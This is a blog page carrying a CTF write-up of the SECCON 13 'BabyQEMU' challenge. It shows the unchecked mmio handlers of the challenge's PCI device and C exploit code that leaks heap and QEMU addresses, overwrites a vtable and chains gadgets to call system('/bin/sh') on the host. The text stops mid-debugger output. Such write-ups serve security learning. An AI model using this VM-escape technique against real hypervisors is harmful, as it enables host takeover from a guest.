<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>SECCON CTF 13 Quals - BabyQEMU | kileak</title>





<meta name="description" content="SECCON CTF 13 Quals - BabyQEMU">


<meta name="keywords" content="seccon, babyqemu">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2024/seccon13quals-babyqemu/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">SECCON CTF 13 Quals - BabyQEMU</h1>
      <p class="post-meta">Nov 24, 2024</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>SECCON CTF 13 Quals - BabyQEMU
<!--break--></p>

  <p>author:ShiftCrops</p>

  <p>nc babyqemu.seccon.games 3824</p>

  <p>Team: Super Guesser</p>

  <p>Attachment: 
<a href="https://kileak.github.io/assets/seccon13quals/babyqemu/BabyQEMU.tar.gz">BabyQEMU.tar.gz</a> 
<a href="https://kileak.github.io/assets/seccon13quals/babyqemu/xpl.py">xpl.py</a> 
<a href="https://kileak.github.io/assets/seccon13quals/babyqemu/pwn.c">pwn.c</a></p>
</blockquote>

<p>BabyQEMU was nice entry level challenge to learn about QEMU escape. It provided a pci device <code class="language-plaintext highlighter-rouge">babydev</code>, which allowed to read/write memory via <code class="language-plaintext highlighter-rouge">mmio</code> access.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">pci_babydev_mmio_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="o">*</span><span class="n">reg</span> <span class="o">=</span> <span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span><span class="p">;</span>

	<span class="n">debug_printf</span><span class="p">(</span><span class="s">"addr:%lx, size:%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

	<span class="k">switch</span><span class="p">(</span><span class="n">addr</span><span class="p">){</span>
		<span class="k">case</span> <span class="n">MMIO_GET_DATA</span><span class="p">:</span>
			<span class="n">debug_printf</span><span class="p">(</span><span class="s">"get_data (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]);</span>
			<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">];</span>
	<span class="p">}</span>
	
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_babydev_mmio_write</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">PCIBabyDevState</span> <span class="o">*</span><span class="n">ms</span> <span class="o">=</span> <span class="n">opaque</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">PCIBabyDevReg</span> <span class="o">*</span><span class="n">reg</span> <span class="o">=</span> <span class="n">ms</span><span class="o">-&gt;</span><span class="n">reg_mmio</span><span class="p">;</span>

	<span class="n">debug_printf</span><span class="p">(</span><span class="s">"addr:%lx, size:%d, val:%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>

	<span class="k">switch</span><span class="p">(</span><span class="n">addr</span><span class="p">){</span>
		<span class="k">case</span> <span class="n">MMIO_SET_OFFSET</span><span class="p">:</span>
			<span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">MMIO_SET_OFFSET</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span>
			<span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">|=</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">MMIO_SET_DATA</span><span class="p">:</span>
			<span class="n">debug_printf</span><span class="p">(</span><span class="s">"set_data (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]);</span>
			<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">size</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">[</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">size</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
			<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Since there are no out-of-bounds check at all in place, we can read anywhere in QEMU memory (knowing the offsets between the different memory regions, we can even read outside of qemu heap).</p>

<p>So, we just need to write some code to access the device and map a <code class="language-plaintext highlighter-rouge">mmio</code> region to trigger the functions inside the device.</p>

<p>For doing <code class="language-plaintext highlighter-rouge">mmio</code> access, we have to map a memory region to the pci device. Then we can trigger the different functions by writing values to specific offsets in that memory region.</p>

<p>For reading or writing data, we first have to set <code class="language-plaintext highlighter-rouge">reg-&gt;offset</code> to the offset, from which we want to read/write. This can be done, by writing the lower 32bit of the offset to <code class="language-plaintext highlighter-rouge">mmio_mem + MMIO_SET_OFFSET</code> and the higher 32bit of the offset to <code class="language-plaintext highlighter-rouge">mmio_mem + MMIO_SET_OFFSET+4</code>.</p>

<p>Reading data from the previously set offset, can then be done by reading from <code class="language-plaintext highlighter-rouge">mmio_mem + MMIO_GET_DATA</code>.</p>

<p>Writing data is done by writing to <code class="language-plaintext highlighter-rouge">mmio_mem + MMIO_SET_DATA</code>.</p>

<p>So, let’s create some starter code for this:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span>
<span class="cp">#define MMIO_SET_OFFSET 0
#define MMIO_SET_DATA 8
#define MMIO_GET_DATA 8
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mmio_mem</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">mmio_write</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint32_t</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_offset_lo</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_offset_hi</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_value</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">mmio_read</span><span class="p">(</span><span class="n">MMIO_GET_DATA</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">mmio_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>

    <span class="n">mmio_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"MMIO FD: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"MMIO MEM: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mmio_mem</span><span class="p">);</span>

    <span class="n">munmap</span><span class="p">(</span><span class="n">mmio_mem</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">mmio_fd</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Now, let’s take a look at the memory region, we can directly access via <code class="language-plaintext highlighter-rouge">pci_babydev_mmio_write</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">──────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555556271100  →  0x0000555555902170  →   endbr64 
$rbx   : 0x00005555580b2800  →  0x00005555570a35b0  →  0x0000555556ffaed0  →  0x0000555556ffb050  →  "memory-region"
$rcx   : 0x4               
$rdx   : 0x120             
$rsp   : 0x00007ffff55feb58  →  0x0000555555c88034  →   mov rax, QWORD PTR [rsp+0x38]
$rbp   : 0x120             
$rsi   : 0x0               
$rdi   : 0x00005555580b1d20  →  0x000055555714c7b0  →  0x0000555556fa4100  →  0x0000555556fa4280  →  0x0000000079626162 ("baby"?)
$rip   : 0x00005555559021b0  →   endbr64 
$r8    : 0x0               
$r9    : 0xffffffff        
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x0               
$r13   : 0x4               
$r14   : 0x4               
$r15   : 0x0000555555c87fb0  →   endbr64 
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555559021a4                  xor    edi, edi
   0x5555559021a6                  ret    
   0x5555559021a7                  nop    WORD PTR [rax+rax*1+0x0]
●→ 0x5555559021b0                  endbr64 
   0x5555559021b4                  mov    rax, QWORD PTR [rdi+0xbf0]
   0x5555559021bb                  mov    r8, rdx
   0x5555559021be                  cmp    rsi, 0x4
   0x5555559021c2                  je     0x555555902220
   0x5555559021c4                  cmp    rsi, 0x8
────────────────────────── extra ────
[+] Hit breakpoint *0x00005555559021B0 (mmio_write)

gef➤  x/30gx $rdi
0x5555580b1d20:	0x000055555714c7b0	0x00007ffff78c76f0  &lt;= opaque
0x5555580b1d30:	0x00005555580b0ae0	0x0000000000000009
0x5555580b1d40:	0x0000555557250970	0x0000000000000000
0x5555580b1d50:	0x00005555580b07e0	0x0000000000000001
0x5555580b1d60:	0x0000000000000000	0x00005555580b2a90
0x5555580b1d70:	0x0000000000000000	0x0000555557334e90
0x5555580b1d80:	0x0000000000000000	0x0000000000000000
0x5555580b1d90:	0x0000000000000000	0xffffffff00000000
0x5555580b1da0:	0x0000000000000000	0x0000000000000000
0x5555580b1db0:	0x0000000000000000	0x0000000000000001
0x5555580b1dc0:	0x0000000000000100	0x00005555580b4220
0x5555580b1dd0:	0x00005555580b4330	0x00005555580b4440
0x5555580b1de0:	0x00005555580b4550	0x00005555580b4660
0x5555580b1df0:	0x0000000000000020	0x00005555580b1d20 &lt;= x / ptr to opaque
0x5555580b1e00:	0x0000000000000001	0x0000000079626162

gef➤  x/30gx $rdi+0xbf8
0x5555580b2918:	0x0000000000000000	0x0000000000000000 &lt;= ms-&gt;buffer
0x5555580b2928:	0x0000000000000000	0x0000000000000000
0x5555580b2938:	0x0000000000000000	0x0000000000000000
0x5555580b2948:	0x0000000000000000	0x0000000000000000
0x5555580b2958:	0x0000000000000000	0x0000000000000000

...

0x5555580b2a08:	0x0000000000000000	0x0000000000000000
0x5555580b2a18:	0x0000000000000000	0x0000000000000000
0x5555580b2a28:	0x0000000000000061	0x00005555580b0c40
0x5555580b2a38:	0x00005555580b0c20	0x0000000000000000  &lt;= QEMU heap leak
0x5555580b2a48:	0x0000555555d084a0	0x0000000000000000  &lt;= QEMU leak
0x5555580b2a58:	0x0000555555d03330	0x0000555555d05bd0
0x5555580b2a68:	0x0000000000000000	0x00005555580b1d20
0x5555580b2a78:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>There are already all leaks in reach, which we need for this challenge. We just have to use offsets relatively to <code class="language-plaintext highlighter-rouge">ms-&gt;buffer</code> (which is located at <code class="language-plaintext highlighter-rouge">opaque+0xbf8</code>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">read_addr_offset</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">set_offset_lo</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">set_offset_hi</span><span class="p">((</span><span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">addr_lo</span> <span class="o">=</span> <span class="n">get_value</span><span class="p">();</span>

    <span class="n">set_offset_lo</span><span class="p">((</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">set_offset_hi</span><span class="p">(((</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">addr_hi</span> <span class="o">=</span> <span class="n">get_value</span><span class="p">();</span>

    <span class="k">return</span> <span class="p">(</span><span class="n">addr_hi</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">addr_lo</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="p">...</span>

    <span class="kt">uint64_t</span> <span class="n">heapleak</span> <span class="o">=</span> <span class="n">read_addr_offset</span><span class="p">(</span><span class="mh">0x120</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">qemuleak</span> <span class="o">=</span> <span class="n">read_addr_offset</span><span class="p">(</span><span class="mh">0x130</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">qemubase</span> <span class="o">=</span> <span class="n">qemuleak</span> <span class="o">-</span> <span class="mh">0x7b44a0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">opaque</span> <span class="o">=</span> <span class="n">read_addr_offset</span><span class="p">(</span><span class="o">-</span><span class="mh">0xbf8</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">);</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"HEAP leak     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">heapleak</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"QEMU leak     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">qemuleak</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"QEMU base     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">qemubase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"opaque        : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">opaque</span><span class="p">);</span>    </code></pre></figure>

<p>Didn’t have symbols to find the correct vtables, so I just went haywire and overwrote everything on the heap to find out, if there’s some kind of vtable, that would get called.</p>

<p>And found this candidate:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x5555deadbeef    
$rbx   : 0x00005555572d1f80  →  0x00005555570a35b0  →  0x0000555556ffaed0  →  0x0000555556ffb050  →  "memory-region"
$rcx   : 0x1               
$rdx   : 0x4               
$rsp   : 0x00007ffff55feec0  →  0x00000000000000b0
$rbp   : 0x4               
$rsi   : 0xb0              
$rdi   : 0x00005555572d1f80  →  0x00005555570a35b0  →  0x0000555556ffaed0  →  0x0000555556ffb050  →  "memory-region"
$rip   : 0x0000555555c87011  →   mov r9, QWORD PTR [rax+0x38]
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0xb0              
$r13   : 0x1               
$r14   : 0x0               
$r15   : 0x2               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555c87006                  mov    rbx, rdi
   0x555555c87009                  sub    rsp, 0x8
   0x555555c8700d                  mov    rax, QWORD PTR [rdi+0x50]
 → 0x555555c87011                  mov    r9, QWORD PTR [rax+0x38]
   0x555555c87015                  test   r9, r9
   0x555555c87018                  je     0x555555c8702c
   0x555555c8701a                  mov    rdi, QWORD PTR [rdi+0x58]
   0x555555c8701e                  movzx  ecx, cl
   0x555555c87021                  call   r9</code></pre></figure>

<p>Since we control <code class="language-plaintext highlighter-rouge">rax</code> at this point, we can also let it point to somewhere on the heap, where we can prepare a fake <code class="language-plaintext highlighter-rouge">vtable</code>, which would then give us more control over code execution.</p>

<p>After some digging through the heap, I found a reference to this, with which we can calculate the offset to overwrite to control it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="n">mmio_ptr</span> <span class="o">=</span> <span class="n">read_addr_offset</span><span class="p">(</span><span class="o">-</span><span class="mh">0xbf8</span> <span class="o">-</span> <span class="mh">0x7b0</span><span class="p">);</span>
<span class="kt">uint64_t</span> <span class="n">target_off</span> <span class="o">=</span> <span class="n">opaque</span> <span class="o">-</span> <span class="n">mmio_ptr</span> <span class="o">-</span> <span class="mh">0x50</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"mmio_ptr      : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mmio_ptr</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"target_off    : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target_off</span><span class="p">);</span></code></pre></figure>

<p>Now we just have to put everything together. To get control over <code class="language-plaintext highlighter-rouge">rdi</code>, I used this gadget</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000000000575a0e: mov rdi, qword ptr [rax + 0x10]; call qword ptr [rax];
</code></pre></div></div>

<p>With this, we can set <code class="language-plaintext highlighter-rouge">rdi</code> and call another function. Calling <code class="language-plaintext highlighter-rouge">system</code> directly would segfault though, since the stack is currently not correctly aligned. We could get around this, by using an offset to <code class="language-plaintext highlighter-rouge">system</code> fixing the stack, but I just went using another call gadget</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x000000000035f5d5: call qword ptr [rax + 8];
</code></pre></div></div>

<p>This would move the stack by 8 bytes, aligning it, and then call <code class="language-plaintext highlighter-rouge">system</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// 0x0000000000575a0e: mov rdi, qword ptr [rax + 0x10]; call qword ptr [rax];</span>
<span class="c1">// 0x000000000035f5d5: call qword ptr [rax + 8];</span>
<span class="kt">uint64_t</span> <span class="n">system</span> <span class="o">=</span> <span class="n">qemubase</span> <span class="o">+</span> <span class="mh">0x324150</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">setrdigadget</span> <span class="o">=</span> <span class="n">qemubase</span> <span class="o">+</span> <span class="mh">0x0000000000575a0e</span><span class="p">;</span>

<span class="kt">uint64_t</span> <span class="n">callrax8</span> <span class="o">=</span> <span class="n">qemubase</span> <span class="o">+</span> <span class="mh">0x000000000035f5d5</span><span class="p">;</span>

<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">callrax8</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>                                 <span class="c1">// rax</span>
<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x24</span><span class="p">,</span> <span class="n">callrax8</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">);</span>                                        <span class="c1">// rax</span>

<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>                             <span class="c1">// rax+0x8</span>
<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">);</span>                                <span class="c1">// rax+0x8</span>

<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="p">((</span><span class="n">heapleak</span> <span class="o">+</span> <span class="mh">0x1d20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>      <span class="c1">// rax + 0x10 =&gt; address of bin/sh</span>
<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">heapleak</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">);</span>

<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x6e69622f</span><span class="p">);</span>                                     <span class="c1">// rax+0x18 =&gt; bin/sh</span>
<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x68732f</span><span class="p">);</span>

<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">setrdigadget</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span> <span class="c1">// gadget (call [rax])</span>
<span class="n">write_addr_offset</span><span class="p">(</span><span class="mh">0x24</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">setrdigadget</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">);</span>

<span class="n">write_addr_offset</span><span class="p">(</span><span class="o">-</span><span class="mh">0xbf8</span> <span class="o">-</span> <span class="n">target_off</span><span class="p">,</span> <span class="n">opaque</span> <span class="o">+</span> <span class="mh">0xbf8</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>                  <span class="c1">// overwrite vtable</span></code></pre></figure>

<p>Executing this, will now trigger our initial gadget</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555580b2938  →  0x00005555558b35d5  →   call QWORD PTR [rax+0x8]
$rbx   : 0x00005555572d1f80  →  0x00005555570a35b0  →  0x0000555556ffaed0  →  0x0000555556ffb050  →  "memory-region"
$rcx   : 0x1               
$rdx   : 0x4               
$rsp   : 0x00007ffff55fec98  →  0x0000555555c87024  →   test al, al
$rbp   : 0x4               
$rsi   : 0x1004            
$rdi   : 0x00005555572d1ee0  →  0x000055555716be60  →  0x0000555556feeec0  →  0x0000555556fef040  →  0x0000000063697061 ("apic"?)
$rip   : 0x0000555555ac9a0e  →   mov rdi, QWORD PTR [rax+0x10]
$r8    : 0x1               
$r9    : 0x0000555555ac9a0e  →   mov rdi, QWORD PTR [rax+0x10]
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x1004            
$r13   : 0x1               
$r14   : 0x1               
$r15   : 0x2               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555ac9a03                  mov    rbp, QWORD PTR [rbp+0x18]
